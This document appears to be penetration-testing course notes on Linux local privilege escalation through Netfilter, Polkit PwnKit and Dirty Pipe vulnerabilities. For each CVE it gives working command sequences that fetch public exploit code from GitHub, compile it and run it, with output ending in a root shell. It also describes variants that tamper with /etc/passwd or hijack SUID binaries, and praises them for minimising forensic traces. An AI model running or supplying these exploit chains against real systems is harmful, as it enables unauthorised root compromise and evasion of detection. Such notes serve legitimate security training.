Netfilter is a Linux kernel module that provides packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and configured rules. Netfilter acts as a software layer in the Linux kernel — when network packets are received and sent, it initiates the execution of other modules such as packet filters. Programs like iptables and arptables serve as action mechanisms of the Netfilter hook system for the IPv4 and IPv6 protocol stacks. The three main functions of Netfilter are packet defragmentation, connection tracking, and network address translation (NAT). Several serious privilege escalation vulnerabilities have been discovered in Netfilter including CVE-2021-22555 in 2021, CVE-2022-25636 in 2022, and CVE-2023-32233 in 2023. These are particularly relevant because many companies run older unpatched Linux distributions in production due to compatibility requirements with their software applications.

Netfilter — CVE-2021-22555

CVE-2021-22555 affects Linux kernel versions 2.6 through 5.11. It exploits a heap out-of-bounds write vulnerability in the Netfilter subsystem's socket option handling. The exploit uses a namespace sandbox to set up the necessary conditions, then corrupts heap memory in multiple stages to eventually gain kernel code execution and escalate to root. The exploit is compiled as a 32-bit binary using the -m32 flag and linked statically to avoid library dependency issues. Confirm the kernel version is within the vulnerable range with uname -r before downloading and compiling the exploit source.

$ uname -r
5.10.5-051005-generic

$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c

$ gcc -m32 -static exploit.c -o exploit

$ ./exploit

[+] Linux Privilege Escalation by theflow@ - 2021

[+] STAGE 0: Initialization
[*] Setting up namespace sandbox...
[+] STAGE 1: Memory corruption
[*] Spraying primary messages...
[+] fake_idx: fff
[+] real_idx: fdf
<SNIP>

root@ubuntu:/home/cry0l1t3# id
uid=0(root) gid=0(root) groups=0(root)
Netfilter — CVE-2022-25636

CVE-2022-25636 affects Linux kernel versions 5.4 through 5.6.10 in the net/netfilter/nf_dup_netdev.c component. It is a heap out-of-bounds write vulnerability that grants root privileges to local users. The exploit leaks kernel pointers, sprays kernel memory structures, causes a use-after-free condition to rewrite key kernel data, and uses ROP (Return Oriented Programming) chains to gain code execution as root. This exploit is particularly dangerous because it can corrupt the kernel and make the system unstable, potentially requiring a reboot. Always be cautious running this against any system you cannot easily restart, and never run it against production systems without authorisation and a maintenance window.

$ uname -r
5.13.0-051300-generic

$ git clone https://github.com/Bonfee/CVE-2022-25636.git
$ cd CVE-2022-25636
$ make
$ ./exploit

[*] STEP 1: Leak child and parent net_device
[+] parent net_device ptr: 0xffff991285dc0000
[*] STEP 2: Spray kmalloc-192, overwrite msg_msg.security ptr
[*] STEP 3: Spray kmalloc-4k using setxattr + FUSE to realloc net_device
[*] STEP 4: Leak kaslr
[*] kaslr base: 0xffffffff80ffefa0
[*] STEP 6: rop :)

# id
uid=0(root) gid=0(root) groups=0(root)
Netfilter — CVE-2023-32233

CVE-2023-32233 exploits a Use-After-Free (UAF) vulnerability in the nf_tables component of the Linux kernel up to version 6.3.1. The nf_tables subsystem uses anonymous sets as temporary workspaces for processing batch requests. Once processing completes these anonymous sets are supposed to be cleared and made inaccessible. Due to a coding mistake the cleared anonymous sets are not properly invalidated and can still be accessed and modified after being freed — this is the Use-After-Free condition. The exploit manipulates the system to use these freed memory regions to interact with kernel memory structures, ultimately gaining the ability to overwrite kernel function pointers and execute arbitrary code as root. The exploit uses the libmnl and libnftnl libraries for netlink communication and requires them to be installed for compilation.

$ git clone https://github.com/Liuk3r/CVE-2023-32233
$ cd CVE-2023-32233
$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl

$ ./exploit

[*] Netfilter UAF exploit
[*] Checking for available CPUs...
[*] Reserved CPU 0 for PWN Worker
[*] Creating "/tmp/modprobe"...
[*] Signaling PWN Worker...
<SNIP>
[*] You've Got ROOT:-)

# id
uid=0(root) gid=0(root) groups=0(root)
Polkit

PolicyKit (polkit) is an authorization service on Linux-based operating systems that manages communication between user-level software and privileged system components. It determines whether a user application is authorized to perform a specific system-level action without needing to run the entire application as root. Polkit works with two groups of files — actions and policies stored in /usr/share/polkit-1/actions/ which define what privileged operations exist, and rules stored in /usr/share/polkit-1/rules.d/ which define who can perform those operations and under what conditions. Custom local authority rules can be placed in /etc/polkit-1/localauthority/50-local.d/ with the .pkla extension. The three main polkit tools are pkexec which runs a program with the rights of another user or root (equivalent to sudo), pkaction which displays available actions, and pkcheck which checks if a process is authorized for a specific action. The most interesting for privilege escalation is pkexec.

$ pkexec -u root id
uid=0(root) gid=0(root) groups=0(root)
Polkit — CVE-2021-4034 PwnKit

CVE-2021-4034, known as PwnKit, is a memory corruption vulnerability in the pkexec tool that was hidden for over ten years before discovery and disclosure in November 2021. It was fixed two months later in January 2022. The vulnerability allows any unprivileged local user to gain full root privileges on any Linux system that has polkit installed — which is essentially every major Linux distribution. The exploit works by corrupting the argument list passed to pkexec in a way that causes it to unsafely import environment variables, which can then be used to load a malicious shared library with root privileges. The PoC is available on GitHub and is straightforward to compile and run directly on the target system. Because this vulnerability existed for over a decade, any unpatched system regardless of its apparent security posture is likely vulnerable.

$ git clone https://github.com/arthepsy/CVE-2021-4034.git
$ cd CVE-2021-4034
$ gcc cve-2021-4034-poc.c -o poc

$ ./poc

# id
uid=0(root) gid=0(root) groups=0(root)
Dirty Pipe — CVE-2022-0847

Dirty Pipe is a vulnerability in the Linux kernel named for its similarity to the older Dirty COW (CVE-2016-5195) vulnerability. It affects all kernel versions from 5.8 to 5.17. The vulnerability allows any user with read access to a file to write arbitrary data into that file — including root-owned files. This works because of a flaw in how the Linux pipe mechanism handles memory pages. Pipes are a unidirectional inter-process communication mechanism — the vulnerability arises from incorrect initialisation of the flags member in new pipe buffer structures, allowing a user to overwrite page cache data for files they only have read access to. Android phones are also affected because Android apps run with user rights and a malicious app could exploit this to gain device control. Two exploit variants are available — the first modifies /etc/passwd to remove the root password, and the second hijacks a SUID binary to get a root shell.

Dirty Pipe — Checking Kernel Version and Compiling

The first step is confirming the kernel version falls within the vulnerable range of 5.8 to 5.17. The uname -r command shows the running kernel version. Kernel 5.13.0 confirmed as vulnerable. Download the exploit repository which contains multiple exploit variants along with a compile script. Run bash compile.sh which compiles both exploit variants. The compile script handles all the required flags and dependencies automatically.

$ uname -r
5.13.0-46-generic

$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
$ cd CVE-2022-0847-DirtyPipe-Exploits
$ bash compile.sh
Dirty Pipe — Exploit 1: Modifying /etc/passwd

The first exploit variant directly modifies /etc/passwd to remove the password hash for the root account, replacing it with an empty field. When the password field in /etc/passwd is empty the system accepts any password (or no password) for that account via the su command. The exploit backs up the original /etc/passwd, patches it, drops you into a root shell, and then automatically restores the original file when you exit — minimising the forensic footprint of the attack. This is useful when you want a quick root shell and can tolerate briefly modifying a sensitive system file.

$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell...

id
uid=0(root) gid=0(root) groups=0(root)
Dirty Pipe — Exploit 2: SUID Binary Hijacking

The second exploit variant uses the Dirty Pipe write primitive to temporarily overwrite the content of a SUID binary with a root shell payload, executes it to get a root shell, and then restores the original binary. This approach is stealthier than modifying /etc/passwd in some respects because it targets a binary rather than a user database file. The first step is finding all SUID binaries on the system using find. Then pass the full path of any SUID binary as an argument to exploit-2. The exploit overwrites it with a shell dropper, executes it, and restores the original. A cleanup file /tmp/sh is created and you are reminded to remove it after the session.

$ find / -perm -4000 2>/dev/null

/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/su
<SNIP>

$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),1000(cry0l1t3)

# rm /tmp/sh

